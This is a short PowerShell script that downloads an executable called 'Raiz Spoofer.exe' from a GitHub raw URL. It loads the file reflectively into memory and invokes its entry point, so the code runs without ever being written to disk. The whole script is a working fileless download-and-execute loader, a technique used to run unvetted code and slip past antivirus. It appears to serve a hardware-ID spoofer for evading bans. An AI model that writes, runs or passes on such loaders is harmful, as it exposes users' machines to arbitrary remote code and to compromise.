$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

try {
    Write-Host "[*] Downloading: Raiz Spoofer.exe" -ForegroundColor Cyan
    $data = (New-Object System.Net.WebClient).DownloadData($url)

    Write-Host "[*] Loading into Memory..." -ForegroundColor Cyan
    $assembly = [System.Reflection.Assembly]::Load($data)
    
    Write-Host "[+] Executing..." -ForegroundColor Green
    $assembly.EntryPoint.Invoke($null, @($null))
    
    Write-Host "[!] SUCCESS: Loaded!" -ForegroundColor Green
}
catch {
    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
}
